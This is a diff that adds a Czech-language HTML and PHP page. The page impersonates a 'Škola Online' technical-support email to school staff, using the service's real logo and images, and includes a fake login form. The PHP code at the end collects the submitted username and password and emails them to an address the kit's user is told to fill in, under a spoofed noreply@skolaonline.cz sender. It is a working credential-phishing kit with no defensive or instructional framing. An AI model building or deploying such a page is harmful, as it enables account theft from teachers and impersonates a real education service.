@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="cs">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Žádost o spolupráci – Škola Online</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header img {
+            max-width: 150px;
+        }
+
+        h1 {
+            color: #00C48C;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        table {
+            width: 100%;
+            margin: 25px 0;
+            border-collapse: collapse;
+        }
+
+        th,
+        td {
+            text-align: left;
+            padding: 12px 15px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        th {
+            background-color: #333333;
+            color: #ffffff;
+        }
+
+        .button {
+            display: inline-block;
+            background-color: #00C48C;
+            color: white !important;
+            padding: 15px 25px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+        }
+
+        /* LOGIN PODLE OBRÁZKU */
+        .login-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-top: 40px;
+        }
+
+        .login-container {
+            background: #ffffff;
+            padding: 30px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 360px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .login-container h1 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 8px 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .form-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .form-row a {
+            text-decoration: none;
+            color: #0078d4;
+        }
+
+        .form-row a:hover {
+            text-decoration: underline;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .btn {
+            padding: 10px;
+            border-radius: 4px;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+            color: #ffffff;
+            font-weight: 500;
+        }
+
+        .btn-primary {
+            background-color: #28a745;
+        }
+
+        .btn-ms {
+            background-color: #0078d4;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .register {
+            text-align: center;
+            font-size: 13px;
+        }
+
+        .register a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .register a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- TVŮJ PŮVODNÍ EMAIL BLOK -->
+    <div class="container">
+        <div class="header">
+            <img src="https://www.skolaonline.cz/wp-content/uploads/logo-skola-online.svg" alt="Škola Online logo" />
+        </div>
+
+        <h1>Důležitá žádost o spolupráci – Škola Online</h1>
+
+        <p>Dobrý den,</p>
+
+        <p>
+            Dovolujeme si Vás informovat v rámci spolupráce a analýzy využívání systému <strong>Škola Online</strong>. Pro zajištění správného nastavení a fungování školního prostředí Vás prosíme o zaslání některých základních údajů souvisejících s Vaším působením v systému.
+        </p>
+
+        <table>
+            <tr>
+                <th>Typ údajů</th>
+                <td>Pracovní kontakt, vyučované předměty, případně další relevantní informace</td>
+            </tr>
+            <tr>
+                <th>Účel</th>
+                <td>Interní analýza a zlepšení práce s platformou Škola Online</td>
+            </tr>
+            <tr>
+                <th>Ochrana dat</th>
+                <td>Veškeré údaje budou zpracovány důvěrně a nebudou nikde zveřejněny</td>
+            </tr>
+        </table>
+
+        <p>Pro přístup do systému použijte tento odkaz:</p>
+        <p style="text-align: center;">
+            <a href="https://www.SPSTJBC.cz" target="_blank" class="button">Přihlásit se do Škola Online</a>
+        </p>
+
+        <p>Prosíme, zašlete požadované informace na tento e-mail odpovědí co nejdříve.</p>
+
+        <p>
+            Děkujeme za spolupráci.<br><br>
+            S pozdravem,<br>
+            <strong>Oddělení technické podpory</strong><br>
+            Školy Online
+        </p>
+
+        <div class="footer">
+            Tento e-mail je určen pouze příjemci. Veškeré poskytnuté informace budou zpracovány s maximálním ohledem na diskrétnost.
+        </div>
+    </div>
+
+    <div style="max-width: 600px; margin: 20px auto;">
+        <img src="https://www.skolaonline.cz/wp-content/themes/yootheme/cache/da/businessman-using-digital-tablet-office-da451627.webp" style="width:100%; height:auto; border-radius:6px;" />
+    </div>
+
+    <!-- LOGIN PODLE OBRÁZKU -->
+    <div class="login-wrapper">
+        <div class="login-container">
+            <h1>Přihlášení</h1>
+
+            <form>
+                <div class="form-group">
+                    <label for="username">Uživatelské jméno</label>
+                    <input type="text" id="username" name="username" />
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Heslo</label>
+                    <input type="password" id="password" name="password" />
+                </div>
+
+                <div class="form-row">
+                    <label class="remember">
+                        <input type="checkbox" name="remember" />
+                        <span>Zapamatovat</span>
+                    </label>
+                    <a href="#">Zapomenuté heslo</a>
+                </div>
+
+                <div class="buttons">
+                    <button type="submit" class="btn btn-primary">
+                        Přihlásit do aplikace
+                    </button>
+                    <button type="button" class="btn btn-ms">
+                        Přihlásit přes Microsoft
+                    </button>
+                </div>
+
+                <div class="register">
+                    Nemáte registrovaný účet?
+                    <a href="#">Pokračujte zde.</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+<?php
+
+$to = "TVŮJ_EMAIL@domena.cz";  // sem napiš svůj e-mail
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+$remember = isset($_POST['remember']) ? "Ano" : "Ne";
+
+$subject = "Nové přihlášení ze Škola Online";
+$message = "
+Uživatel se pokusil přihlásit:
+
+Uživatelské jméno: $username
+Heslo: $password
+Zapamatovat: $remember
+";
+
+$headers = "From: noreply@skolaonline.cz";
+
+mail($to, $subject, $message, $headers);
+
+echo "Děkujeme, údaje byly odeslány.";
+?>
